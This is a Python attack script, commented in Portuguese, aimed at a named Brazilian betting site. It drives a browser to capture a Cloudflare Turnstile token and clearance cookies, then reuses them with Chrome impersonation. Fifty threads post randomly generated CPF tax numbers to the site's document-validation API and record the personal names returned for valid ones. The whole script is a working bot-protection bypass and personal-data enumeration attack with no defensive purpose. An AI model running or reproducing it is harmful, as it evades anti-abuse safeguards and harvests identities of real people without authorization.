#!/usr/bin/env python3
"""
Injetor com Token Turnstile - Bypass usando token válido do Cloudflare
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright
from curl_cffi import requests as curl_requests

# Configuração
SITEKEY = "0x4AAAAAAAykd8yJm3kQzNJc"
THREADS = 50
RODADAS = 4  # 50 x 4 = 200 requisições por token

# Variáveis globais
lock = threading.Lock()
stats = {"ok": 0, "validos": 0, "blocked": 0, "erro": 0}
cpfs_validos = []
TURNSTILE_TOKEN = None
CF_COOKIES = {}

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def obter_token_turnstile():
    """Obtém um token Turnstile válido usando o navegador"""
    global TURNSTILE_TOKEN, CF_COOKIES
    
    print("\n🔐 Obtendo token Turnstile...")
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        
        # Navega para o site
        page.goto("https://7k.bet.br/")
        page.wait_for_timeout(3000)
        
        # Clica em CADASTRAR
        try:
            page.click("button:has-text('CADASTRAR')", timeout=5000)
            page.wait_for_timeout(2000)
        except:
            pass
        
        # Espera o Turnstile resolver
        print("   ⏳ Aguardando Turnstile resolver...")
        
        for _ in range(30):
            # Tenta encontrar o token no DOM
            token = page.evaluate("""() => {
                const input = document.querySelector('[name="cf-turnstile-response"]');
                if (input && input.value) return input.value;
                
                // Tenta via window
                if (window.turnstile) {
                    const widgets = document.querySelectorAll('.cf-turnstile');
                    for (const w of widgets) {
                        const id = w.getAttribute('data-widget-id');
                        if (id) {
                            const response = window.turnstile.getResponse(id);
                            if (response) return response;
                        }
                    }
                }
                return null;
            }""")
            
            if token:
                TURNSTILE_TOKEN = token
                print(f"   ✅ Token obtido: {token[:50]}...")
                break
            
            page.wait_for_timeout(1000)
        
        # Pega os cookies
        cookies = context.cookies()
        for c in cookies:
            if c['name'] in ['cf_clearance', '__cf_bm']:
                CF_COOKIES[c['name']] = c['value']
        
        browser.close()
    
    if TURNSTILE_TOKEN:
        print(f"   ✅ Cookies: {list(CF_COOKIES.keys())}")
        return True
    else:
        print("   ❌ Não foi possível obter o token")
        return False

def worker(_):
    """Worker que faz requisição com token Turnstile"""
    global stats
    cpf = gerar_cpf()
    
    try:
        session = curl_requests.Session(impersonate="chrome120")
        
        headers = {
            "Content-Type": "application/json",
            "Origin": "https://7k.bet.br",
            "Referer": "https://7k.bet.br/",
        }
        
        # Adiciona o token Turnstile ao payload se disponível
        payload = {"number": cpf, "type": "cpf"}
        if TURNSTILE_TOKEN:
            payload["cf-turnstile-response"] = TURNSTILE_TOKEN
        
        r = session.post(
            "https://7k.bet.br/api/documents/validate",
            json=payload,
            headers=headers,
            cookies=CF_COOKIES,
            timeout=15
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                cpfs_validos.append({"cpf": cpf, "nome": nome})
                stats["validos"] += 1
                stats["ok"] += 1
            elif status == 400:
                stats["ok"] += 1
            elif status == 403:
                stats["blocked"] += 1
            else:
                stats["erro"] += 1
        
        return status
        
    except Exception as e:
        with lock:
            stats["erro"] += 1
        return -1

def main():
    global stats
    
    print("="*60)
    print("💉 INJETOR COM TOKEN TURNSTILE")
    print("="*60)
    
    # Primeiro obtém o token
    if not obter_token_turnstile():
        print("\n❌ Falha ao obter token. Tentando sem token...")
    
    total = THREADS * RODADAS
    print(f"\n🚀 Iniciando {total} requisições ({THREADS} threads x {RODADAS} rodadas)")
    
    inicio = time.time()
    
    for rodada in range(1, RODADAS + 1):
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(worker, i) for i in range(THREADS)]
            for f in as_completed(futures):
                pass
        
        done = rodada * THREADS
        elapsed = time.time() - inicio
        rate = done / elapsed if elapsed > 0 else 0
        
        print(f"[{rodada}/{RODADAS}] ✅{stats['ok']:4d} | 🎯{stats['validos']:3d} | 🚫{stats['blocked']:3d} | {rate:.1f} req/s")
    
    tempo = time.time() - inicio
    
    print("\n" + "="*60)
    print("📊 RESULTADO")
    print("="*60)
    print(f"   Total: {total} req em {tempo:.1f}s")
    print(f"   Velocidade: {total/tempo:.1f} req/s")
    print(f"\n   ✅ OK: {stats['ok']}")
    print(f"   🎯 Válidos: {stats['validos']}")
    print(f"   🚫 Blocked: {stats['blocked']}")
    
    if cpfs_validos:
        print(f"\n🎯 {len(cpfs_validos)} CPFs VÁLIDOS:")
        for v in cpfs_validos[:20]:
            cpf = v["cpf"]
            print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")

if __name__ == "__main__":
    main()







